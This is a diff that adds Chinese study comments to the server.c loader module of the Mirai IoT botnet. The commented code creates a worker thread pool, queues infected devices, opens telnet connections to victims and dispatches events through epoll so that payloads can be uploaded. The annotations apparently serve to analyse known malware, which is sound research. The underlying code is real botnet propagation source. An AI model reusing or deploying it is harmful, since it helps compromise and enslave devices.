@@ -18,66 +18,70 @@
 //server.c       向感染设备发起telnet交互，上传payload文件
 //loader的主要功能在server.c
 
-//创建srv结构体
+//创建srv结构体【维护mirai端的信息，server端的信息。victim是client端，这个server要接收client端的连接】
 struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip)
 {
     struct server *srv = calloc(1, sizeof (struct server)); 
-    struct server_worker *workers = calloc(threads, sizeof (struct server_worker)); * 
+    struct server_worker *workers = calloc(threads, sizeof (struct server_worker));     //貌似没有用到【而且没有释放，内存泄露】
     int i;
 
     // Fill out the structure
-    srv->bind_addrs_len = addr_len;
+    srv->bind_addrs_len = addr_len; //server监听和绑定的地址，以及允许连接入的数量
     srv->bind_addrs = addrs;
     srv->max_open = max_open;
     srv->wget_host_ip = wghip;
     srv->wget_host_port = wghp;
     srv->tftp_host_ip = thip;
-    srv->estab_conns = calloc(max_open * 2, sizeof (struct connection *));
-    srv->workers = calloc(threads, sizeof (struct server_worker));
-    srv->workers_len = threads;
+    //一个server最多只能有max_open个connection，但是这里分配了max_open*2的空间，目的是要以本地创建的socket fd为index来索引得到connection
+    //为了fd能大一点，则多分配一些空间
+    srv->estab_conns = calloc(max_open * 2, sizeof (struct connection *));  //也就是说estab_conns维护连接到这个server的连接信息【运行并行连接的数量由max_open决定】
+    srv->workers = calloc(threads, sizeof (struct server_worker));  //根据参数threads决定这个server的server_worker的数量
+    srv->workers_len = threads;     //server_worker的数量【每一个worker对应一个线程】，因此server_worker的数量就是线程的数量
 
-    if (srv->estab_conns == NULL)
+    if (srv->estab_conns == NULL)   //不能成功分配存储的连接空间
     {
         printf("Failed to allocate establisted_connections array\n");
         exit(0);
     }
 
     // Allocate locks internally
-    for (i = 0; i < max_open * 2; i++)
+    for (i = 0; i < max_open * 2; i++)  //connection的数量为 max_open * 2
     {
-        srv->estab_conns[i] = calloc(1, sizeof (struct connection));
+        srv->estab_conns[i] = calloc(1, sizeof (struct connection));    //为每个连接结构体分配空间
         if (srv->estab_conns[i] == NULL)
         {
             printf("Failed to allocate connection %d\n", i);
             exit(-1);
         }
-        pthread_mutex_init(&(srv->estab_conns[i]->lock), NULL);
+        pthread_mutex_init(&(srv->estab_conns[i]->lock), NULL); //为每个连接初始化对应的lock
     }
 
-    // Create worker threads
-    for (i = 0; i < threads; i++)
+    // Create worker threads【threads的大小应该是当前server所在cpu的核数=>  int num = sysconf(_SC_NPROCESSORS_CONF);】
+    for (i = 0; i < threads; i++)   //初始化这个server的所有server_worker
     {
         struct server_worker *wrker = &srv->workers[i];
 
         wrker->srv = srv;
-        wrker->thread_id = i;
+        wrker->thread_id = i;   //并不是真实的thread_id，只是mirai为了管理worker thread设置的id【实际是这个worker绑定的cpu核的id，从0开始标号】
 
-        if ((wrker->efd = epoll_create1(0)) == -1)
+        if ((wrker->efd = epoll_create1(0)) == -1)  //为每个worker建立一个epoll，看来每个worker会处理多个input/output
         {
             printf("Failed to initialize epoll context. Error code %d\n", errno);
             free(srv->workers);
             free(srv);
             return NULL;
         }
-
-        pthread_create(&wrker->thread, NULL, worker, wrker);
+        //&wrker->thread存储了这个server_worker的线程描述符
+        //pthread_create在线程创建以后，就开始运行相关的线程函数
+        pthread_create(&wrker->thread, NULL, worker, wrker);       //为每个server_worker创建一个对应的线程，每个线程都运行事件处理函数worker函数，以对应的server_worker为参数
     }
 
-    pthread_create(&srv->to_thrd, NULL, timeout_thread, srv);
+    pthread_create(&srv->to_thrd, NULL, timeout_thread, srv);   //每个server有一个对应的线程，运行timeout_thread函数，估计是判断是否超时。
 
-    return srv;
+    return srv; //返回初始化和启动线程后的server结构体
 }
 
+//释放资源
 void server_destroy(struct server *srv)
 {
     if (srv == NULL)
@@ -93,26 +97,27 @@ void server_destroy(struct server *srv)
 //判断能否处理新的感染节点
 void server_queue_telnet(struct server *srv, struct telnet_info *info)
 {
-    while (ATOMIC_GET(&srv->curr_open) >= srv->max_open)
+    while (ATOMIC_GET(&srv->curr_open) >= srv->max_open)    //原子的访问srv->curr_open，判断当前的conn数是否达到上限，达到则等待
     {
         sleep(1);
     }
-    ATOMIC_INC(&srv->curr_open);
+    ATOMIC_INC(&srv->curr_open);    //conn++
 
     if (srv == NULL)
         printf("srv == NULL 3\n");
 
-    server_telnet_probe(srv, info);
+    server_telnet_probe(srv, info); //如果还有能存储connection的位置，就连接这个info。把连接信息更新到srv中
 }
 
-//处理新的感染节点
+//处理新的感染节点【新建本地fd，连接victim，把相关信息加入srv的connection数组，设置worker中的epoll处理本地fd的从victim中收到交互信息】
 void server_telnet_probe(struct server *srv, struct telnet_info *info)
 {
-    int fd = util_socket_and_bind(srv);
+    int fd = util_socket_and_bind(srv);     //bind本地地址，并且返回本地的socket fd。通过这个socket和victim交互
     struct sockaddr_in addr;
     struct connection *conn;
     struct epoll_event event;
     int ret;
+    //选择一个worker，用于处理新感染节点的事件。【curr_worker_child初始应该为0，然后遍历worker，每次顺序选一个worker处理新的感染节点】
     struct server_worker *wrker = &srv->workers[ATOMIC_INC(&srv->curr_worker_child) % srv->workers_len];
 
     if (fd == -1)
@@ -121,70 +126,75 @@ void server_telnet_probe(struct server *srv, struct telnet_info *info)
         {
             printf("Failed to open and bind socket\n");
         }
-        ATOMIC_DEC(&srv->curr_open);
+        ATOMIC_DEC(&srv->curr_open);    //conn--【本地无法新建socket处理新的感染节点，因此server_queue_telnet中的conn++要消除】
         return;
     }
-    while (fd >= (srv->max_open * 2))
+    while (fd >= (srv->max_open * 2))   //fd超过srv->max_open * 2，那么之后srv->estab_conns[fd]查找connection的时候就会越界。
     {
-        printf("fd too big\n");
+        printf("fd too big\n"); //本地socket太大，close
         conn->fd = fd;
 #ifdef DEBUG
         printf("Can't utilize socket because client buf is not large enough\n");
 #endif
-        connection_close(conn);
+        connection_close(conn); //关闭连接，修改srv->curr_open--等参数，fd被置为-1
         return;
     }
 
     if (srv == NULL)
         printf("srv == NULL 4\n");
 
-    conn = srv->estab_conns[fd];
-    memcpy(&conn->info, info, sizeof (struct telnet_info));
+    conn = srv->estab_conns[fd];    //也就是本地的socket标识符是srv的connection数组的下标
+    memcpy(&conn->info, info, sizeof (struct telnet_info)); //把新的感染节点的info复制到&conn->info中
     conn->srv = srv;
-    conn->fd = fd;
-    connection_open(conn);
+    conn->fd = fd;      //和victim连接的本地socket fd
+    connection_open(conn);  //初始化conn的其他参数【状态改为TELNET_CONNECTING】
 
     addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = info->addr;
+    addr.sin_addr.s_addr = info->addr;  //server对victim主动发起连接
     addr.sin_port = info->port;
-    ret = connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
+    ret = connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));   //尝试连接
     if (ret == -1 && errno != EINPROGRESS)
     {
         printf("got connect error\n");
     }
-
+    //成功连接，将server的socket fd加入epoll。用于处理server向victim的读写
     event.data.fd = fd;
-    event.events = EPOLLOUT;
-    epoll_ctl(wrker->efd, EPOLL_CTL_ADD, fd, &event);
+    event.events = EPOLLOUT;    //告诉内核需要监听这个fd的什么事件：允许对这个fd写
+    //也就是说，如果victim对这个fd写了【也就是server传输命令，victim回显结果的时候】，就会触发这个event
+    //从之前选中的处理当前新增感染节点的worker的epoll【wrker->efd】中加入【EPOLL_CTL_ADD】当前需要处理的用于通信的fd【这个fd用于反馈victim的交互情况】
+    epoll_ctl(wrker->efd, EPOLL_CTL_ADD, fd, &event);   //增删改epoll中的fd：https://man7.org/linux/man-pages/man2/epoll_ctl.2.html
 }
 
 
-static void bind_core(int core)
+static void bind_core(int core) //设置某个线程只能在某个core上运行。和这个core绑定。
 {
     pthread_t tid = pthread_self();
     cpu_set_t cpuset;
     CPU_ZERO(&cpuset);
-    CPU_SET(core, &cpuset);
-    if (pthread_setaffinity_np(tid, sizeof (cpu_set_t), &cpuset) != 0)
+    CPU_SET(core, &cpuset); //当前线程只能在cpu_set集合中被设置的cpu核上调度，如果只设置了一个，就这个线程只绑定了一个核。
+    if (pthread_setaffinity_np(tid, sizeof (cpu_set_t), &cpuset) != 0) //https://www.cnblogs.com/vanishfan/archive/2012/11/16/2773325.html
         printf("Failed to bind to core %d\n", core);
 }
 
 //事件处理线程
+//server中有多个并行执行worker函数的线程。
+//arg表示srv中worker结构体信息。
+//https://www.jianshu.com/p/ee381d365a29
 static void *worker(void *arg)
 {
     struct server_worker *wrker = (struct server_worker *)arg;
     struct epoll_event events[128];
 
-    bind_core(wrker->thread_id);
+    bind_core(wrker->thread_id);    //为这个worker线程绑定id为wrker->thread_id的cpu核
 
-    while (TRUE)
+    while (TRUE)    //循环等待victim的交互信息。
     {
-        int i, n = epoll_wait(wrker->efd, events, 127, -1);
-
+        int i, n = epoll_wait(wrker->efd, events, 127, -1); //等待IO事件，如果没有可用事件，则会阻塞当前线程。
+        //返回值表示有多少个待处理事件。
         if (n == -1)
             perror("epoll_wait");
 
-        for (i = 0; i < n; i++)
+        for (i = 0; i < n; i++)     //调用handle_event函数处理每个event事件。
             handle_event(wrker, &events[i]);
     }
 }
